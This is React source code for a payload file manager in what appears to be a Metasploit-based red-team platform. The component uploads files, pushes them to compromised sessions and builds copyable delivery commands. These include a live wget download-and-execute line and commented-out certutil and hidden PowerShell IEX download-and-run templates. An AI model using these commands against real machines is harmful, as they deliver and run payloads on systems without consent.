import React, { Fragment, memo, useImperativeHandle, useState } from "react";
import moment from "moment";
import { getLocale, useRequest } from "umi";
import { deleteMsgrpcFileMsfAPI, getMsgrpcFileMsfAPI, postPostmodulePostModuleActuatorAPI } from "@/services/apiv1";

import { Button, Card, Col, Modal, Row, Space, Table, Tag, Upload } from "antd";
import { CopyOutlined, SyncOutlined, UploadOutlined } from "@ant-design/icons";
import copy from "copy-to-clipboard";
import { getToken } from "@/utils/authority";
import { cssCalc, Downheight } from "@/utils/utils";
import { formatText, manuali18n, msgerror, msgsuccess, msgwarning } from "@/utils/locales";
import { DocIcon } from "@/pages/Core/Common";
import { useModel } from "@@/plugin-model/useModel";

String.prototype.format = function() {
    let args = arguments;
    return this.replace(/\{(\d+)\}/g, function(m, i) {
        return args[i];
    });
};

const { Dragger } = Upload;
const fileMsfUploadPath = "/api/v1/msgrpc/filemsf/?";
const webHost = location.hostname + (location.port ? `:${location.port}` : "");

const downloadFileWayDetail = item => {
    const download_router = "/api/v1/d/?en=";
    const download_url = `${location.protocol}//${webHost}${download_router}${item.enfilename}`;

    const filename = item.name;
    const data = [
        {
            key: "0",
            name: manuali18n("浏览器下载", "Browser Download"),
            cmd: `${download_url}`
        },
        // {
        //   key: '1',
        //   name: 'certutil下载',
        //   cmd: `cmd.exe /c certutil -urlcache -split -f ${download_url} C:\\ProgramData\\${filename}`,
        // },
        // {
        //   key: '2',
        //   name: 'powershell下载',
        //   cmd: `cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('${download_url}','${filename}');`,
        // },
        // {
        //   key: '3',
        //   name: 'powershell内存执行',
        //   cmd: `cmd.exe /c powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('${download_url}');"`,
        // },
        // {
        //   key: '4',
        //   name: 'certutil下载执行exe',
        //   cmd: `cmd.exe /c certutil -urlcache -split -f ${download_url} C:\\ProgramData\\${filename} && C:\\ProgramData\\${filename}`,
        // },
        // {
        //   key: '5',
        //   name: 'powershell下载执行exe',
        //   cmd: `cmd.exe /c powershell.exe -ExecutionPolicy bypass -noprofile -windowstyle hidden (new-object system.net.webclient).downloadfile('${download_url}','${filename}');start-process ${filename}`,
        // },
        {
            key: "6",
            name: manuali18n("Linux下载", "Linux Download"),
            cmd: `wget -O ${filename} --no-check-certificate ${download_url}`
        },
        {
            key: "7",
            name: manuali18n("Linux下载执行", "Linux Download And Exec"),
            cmd: `wget -O ${filename} --no-check-certificate ${download_url} && chmod 755 ${filename} && ./${filename} `
        }
    ];

    const columns = [
        {
            title: manuali18n("操作", "Operation"),
            dataIndex: "name",
            key: "key",
            width: 160
        },
        {
            title: manuali18n("命令", "Cmd"),
            dataIndex: "cmd",
            ellipsis: true
        },
        {
            title: "Action",
            key: "action",
            width: 100,
            render: (text, record) => (
                <Button
                    block
                    icon={<CopyOutlined />}
                    onClick={() => {
                        copy(record.cmd);
                        msgsuccess("已复制到剪切板", "Copyed to clipboard");
                    }}
                >{manuali18n("复制", "Copy")}</Button>
            )
        }
    ];

    Modal.info({
        icon: null,
        className: "styles.oneClickDownload",
        bodyStyle: { padding: "0px 0px 0px 0px" },
        mask: false,
        width: "70vw",
        content: <Table size="small" columns={columns} dataSource={data} pagination={false} />,
        onOk() {
        }
    });
};

const FileMsf = props => {
    console.log("FileMsf");
    const [msfUploading, setMsfUploading] = useState(false);
    const [fileMsfListActive, setFileMsfListActive] = useState([]);
    const {
        resizeDownHeight,
    } = useModel("Resize", model => ({
        resizeDownHeight: model.resizeDownHeight,
    }));

    useImperativeHandle(props.onRef, () => {
        return {
            updateData: () => {
                listFileMsfReq.run();
            }
        };
    });

    useRequest(getMsgrpcFileMsfAPI, {
        onSuccess: (result, params) => {
            setFileMsfListActive(result);
        },
        onError: (error, params) => {
        }
    });

    const listFileMsfForViewReq = useRequest(getMsgrpcFileMsfAPI, {
        manual: true,
        onSuccess: (result, params) => {
            if (result.type === "img") {
                Modal.info({
                    icon: null,
                    bodyStyle: { padding: "0 0 0 0" },
                    mask: false,
                    width: "80vw",
                    content: <img style={{ width: "100%" }} src={`data:image/png;base64,${result.data}`} />
                });
            } else {
                Modal.info({
                    icon: null,
                    style: {
                        top: 40,
                        padding: "0px 0px 0px 0px"
                    },
                    mask: false,
                    width: "70vw",
                    content: (
                        <Fragment>
              <pre
                  style={{
                      width: "100%",
                      maxHeight: "60vh"
                  }}
              >
                {atob(result.data)}
              </pre>
                            <Row>
                                <Button
                                    onClick={() => {
                                        copy(atob(result.data));
                                        msgsuccess("已拷贝到剪切板", "Copyed to clipboard");
                                    }}
                                >
                                    Copy to clipboard
                                </Button>
                            </Row>
                        </Fragment>
                    )
                });
            }
        },
        onError: (error, params) => {
        }
    });

    const listFileMsfForView = name => {
        listFileMsfForViewReq.run({ name, action: "view" });
    };

    const listFileMsfForDownloadReq = useRequest(getMsgrpcFileMsfAPI, {
        manual: true,
        onSuccess: (result, params) => {
        },
        onError: (error, params) => {
        }
    });

    const listFileMsfForDownload = name => {
        listFileMsfForViewReq.run({ name });
    };

    const listFileMsfReq = useRequest(getMsgrpcFileMsfAPI, {
        manual: true,
        onSuccess: (result, params) => {
            setFileMsfListActive(result);
        },
        onError: (error, params) => {
        }
    });

    const createFileMsfUploadOnChange = info => {
        if (info.file.status === "uploading" && msfUploading === false) {
            setMsfUploading(true);
        }
        if (info.file.status === "done") {
            if (200 <= info.file.response.code < 300) {
                msgsuccess("文件上传成功", "File upload successfully");
                listFileMsfReq.run();
            } else {
                msgwarning("文件上传失败", "File upload failed");
            }
            setMsfUploading(false);
        } else if (info.file.status === "error") {
            setMsfUploading(false);
            msgerror(`${info.file.name} 上传失败`, `${info.file.name} upload error`);
        }
    };

    const destoryFileMsfReq = useRequest(deleteMsgrpcFileMsfAPI, {
        manual: true,
        onSuccess: (result, params) => {
            listFileMsfReq.run();
        },
        onError: (error, params) => {
        }
    });

    const operWidth = () => {
        if (getLocale() === "en-US") {
            return 320;
        } else {
            return 240;
        }
    };

    return (
        <Fragment>
            <DocIcon url="https://www.yuque.com/vipersec/help/yc0ipk" />
            <Row
                style={{
                    marginTop: -16
                }}
                gutter={0}
            >
                <Col span={6}>
                    <Dragger
                        name="file"
                        action={fileMsfUploadPath}
                        headers={{ Authorization: `Token ${getToken()}` }}
                        onChange={createFileMsfUploadOnChange}
                        showUploadList={false}
                        loading={msfUploading}
                    >
                        <UploadOutlined /> {formatText("app.filemsf.uploadlabel")}
                    </Dragger>
                </Col>
                <Col span={18}>
                    <Button
                        block
                        icon={<SyncOutlined />}
                        onClick={() => listFileMsfReq.run()}
                        loading={
                            listFileMsfReq.loading ||
                            listFileMsfForDownloadReq.loading ||
                            listFileMsfForViewReq.loading ||
                            msfUploading
                        }
                    >
                        {formatText("app.core.refresh")}
                    </Button>
                    <Table
                        style={{
                            overflow: "auto",
                            maxHeight: cssCalc(`${resizeDownHeight} - 32px`),
                            minHeight: cssCalc(`${resizeDownHeight} - 32px`)
                        }}
                        scroll={{ y: cssCalc(`${resizeDownHeight} - 64px`) }}
                        size="small"
                        bordered
                        pagination={false}
                        rowKey="id"
                        columns={[
                            {
                                title: formatText("app.filemsf.filename"),
                                dataIndex: "name",
                                key: "name",
                                sorter: (a, b) => a.name >= b.name,
                                render: (text, record) => <span>{record.name}</span>
                            },
                            {
                                title: formatText("app.filemsf.size"),
                                dataIndex: "format_size",
                                key: "format_size",
                                sorter: (a, b) => a.size >= b.size,
                                width: 96
                            },
                            {
                                title: formatText("app.filemsf.mtime"),
                                dataIndex: "mtime",
                                key: "mtime",
                                width: 136,
                                sorter: (a, b) => a.mtime >= b.mtime,
                                render: (text, record) => (
                                    <Tag color="cyan">{moment(record.mtime * 1000).format("YYYY-MM-DD HH:mm")}</Tag>
                                )
                            },
                            {
                                dataIndex: "operation",
                                width: operWidth(),
                                render: (text, record) => (
                                    <div style={{ textAlign: "center" }}>
                                        <Space size="middle">
                                            {record.size <= 1024 * 1024 ? (
                                                <Fragment>
                                                    <a
                                                        style={{ color: "green" }}
                                                        onClick={() => listFileMsfForView(record.name)}
                                                    >
                                                        {formatText("app.filemsf.view")}
                                                    </a>
                                                </Fragment>
                                            ) : (
                                                <Fragment>
                                                    <a style={{ visibility: "Hidden" }}>占位</a>
                                                </Fragment>
                                            )}
                                            <a onClick={() => listFileMsfForDownload(record.name)}>{formatText("app.filemsf.download")}</a>
                                            <a style={{ color: "#faad14" }}
                                               onClick={() => downloadFileWayDetail(record)}>
                                                {formatText("app.filemsf.onelinecmd")}
                                            </a>
                                            <a onClick={() => destoryFileMsfReq.run(record)} style={{ color: "red" }}>
                                                {formatText("app.core.delete")}
                                            </a>
                                        </Space>
                                    </div>
                                )
                            }
                        ]}
                        dataSource={fileMsfListActive}
                    />
                </Col>
            </Row>
        </Fragment>
    );
};
export const FileMsfMemo = memo(FileMsf);

export const FileMsfModal = props => {
    console.log("FileMsfModal");
    const { hostAndSessionActive, dirpath } = props;
    const [msfUploading, setMsfUploading] = useState(false);
    const [fileMsfListActive, setFileMsfListActive] = useState([]);
    const fileMsfUploadPath = "/api/v1/msgrpc/filemsf/?";

    const initListFileMsfReq = useRequest(getMsgrpcFileMsfAPI, {
        onSuccess: (result, params) => {
            setFileMsfListActive(result);
        },
        onError: (error, params) => {
        }
    });

    const listFileMsfReq = useRequest(getMsgrpcFileMsfAPI, {
        manual: true,
        onSuccess: (result, params) => {
            setFileMsfListActive(result);
        },
        onError: (error, params) => {
        }
    });

    const listFileMsfForDownloadReq = useRequest(getMsgrpcFileMsfAPI, {
        manual: true,
        onSuccess: (result, params) => {
        },
        onError: (error, params) => {
        }
    });

    const createPostModuleActuatorReq = useRequest(postPostmodulePostModuleActuatorAPI, {
        manual: true,
        onSuccess: (result, params) => {
        },
        onError: (error, params) => {
        }
    });

    const destoryFileMsfReq = useRequest(deleteMsgrpcFileMsfAPI, {
        manual: true,
        onSuccess: (result, params) => {
            listFileMsfReq.run();
        },
        onError: (error, params) => {
        }
    });

    const createFileMsfUploadOnChange = info => {
        if (info.file.status === "uploading" && msfUploading === false) {
            setMsfUploading(true);
        }
        if (info.file.status === "done") {
            if (200 <= info.file.response.code < 300) {
                msgsuccess("文件上传成功", "File upload successfully");
                listFileMsfReq.run();
            } else {
                msgwarning("文件上传失败", "File upload failed");
            }
            setMsfUploading(false);
        } else if (info.file.status === "error") {
            setMsfUploading(false);
            msgerror(`${info.file.name} 上传失败`, `${info.file.name} upload error`);
        }
    };

    return (
        <Fragment>
            <Card
                style={{
                    marginTop: -12,
                    marginLeft: -16,
                    marginRight: -16
                }}
                bordered
                bodyStyle={{ padding: "0px 0px 0px 0px" }}
            >
                <Table
                    style={{
                        overflow: "auto",
                        maxHeight: cssCalc("50vh"),
                        minHeight: cssCalc("50vh")
                    }}
                    loading={listFileMsfReq.loading || listFileMsfForDownloadReq.loading}
                    size="small"
                    bordered
                    pagination={false}
                    rowKey="id"
                    columns={[
                        {
                            title: formatText("app.filemsf.filename"),
                            dataIndex: "name",
                            key: "name",
                            render: (text, record) => <span>{record.name}</span>
                        },
                        {
                            title: formatText("app.filemsf.size"),
                            dataIndex: "format_size",
                            key: "format_size",
                            width: 96
                        },
                        {
                            title: formatText("app.filemsf.mtime"),
                            dataIndex: "mtime",
                            key: "mtime",
                            width: 136,
                            render: (text, record) => (
                                <Tag color="cyan">{moment(record.mtime * 1000).format("YYYY-MM-DD HH:mm")}</Tag>
                            )
                        },
                        {
                            dataIndex: "operation",
                            render: (text, record) => (
                                <div style={{ textAlign: "center" }}>
                                    <Space>
                                        <a
                                            style={{ color: "green" }}
                                            onClick={() =>
                                                createPostModuleActuatorReq.run({
                                                    ipaddress: hostAndSessionActive.ipaddress,
                                                    loadpath: "MODULES.FileSessionUploadModule",
                                                    sessionid: hostAndSessionActive.session.id,
                                                    custom_param: JSON.stringify({
                                                        SESSION_DIR: dirpath,
                                                        MSF_FILE: record.name
                                                    })
                                                })
                                            }
                                        >
                                            {formatText("app.filemsf.uploadtotarget")}
                                        </a>
                                        <a
                                            onClick={() => listFileMsfForDownloadReq.run({ name: record.name })}>{formatText("app.filemsf.download")}</a>
                                        <a
                                            onClick={() => destoryFileMsfReq.run({ name: record.name })}
                                            style={{ color: "red" }}
                                        >
                                            {formatText("app.core.delete")}
                                        </a>
                                    </Space>
                                </div>
                            )
                        }
                    ]}
                    dataSource={fileMsfListActive}
                />
            </Card>
            <Row
                style={{
                    marginLeft: -16,
                    marginRight: -16,
                    marginBottom: -12
                }}
                gutter={1}
            >
                <Col span={16}>
                    <Dragger
                        name="file"
                        action={fileMsfUploadPath}
                        headers={{ Authorization: `Token ${getToken()}` }}
                        onChange={createFileMsfUploadOnChange}
                        loading={msfUploading}
                        showUploadList={{
                            showRemoveIcon: true,
                            showPreviewIcon: false,
                            showDownloadIcon: false
                        }}
                    >
                        <UploadOutlined /> {formatText("app.filemsf.uploadlabel")}
                    </Dragger>
                </Col>
                <Col span={8}>
                    <Button
                        block
                        style={{ height: 64 }}
                        icon={<SyncOutlined />}
                        onClick={() => listFileMsfReq.run()}
                        loading={
                            listFileMsfReq.loading ||
                            listFileMsfForDownloadReq.loading ||
                            createPostModuleActuatorReq.loading
                        }
                    >
                        {formatText("app.core.refresh")}
                    </Button>
                </Col>
            </Row>
        </Fragment>
    );
};
